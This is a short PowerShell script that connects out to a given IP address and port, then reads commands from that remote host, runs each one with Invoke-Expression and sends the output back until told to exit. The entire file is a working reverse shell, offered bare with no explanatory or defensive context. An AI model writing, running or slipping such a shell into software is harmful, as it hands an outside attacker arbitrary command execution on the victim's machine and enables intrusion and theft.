param (
    [string]$ip
    [string]$port
)

Write-Host "Attempting connection to $ip at $port"

$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

while ($true) {
    try {
        $data = $reader.ReadLine()
        if ($data -eq "exit") { break }
        $result = Invoke-Expression $data 2>&1
        $writer.WriteLine($result)
    } catch {
        break
    }
}

$reader.Close()
$writer.Close()
$client.Close()
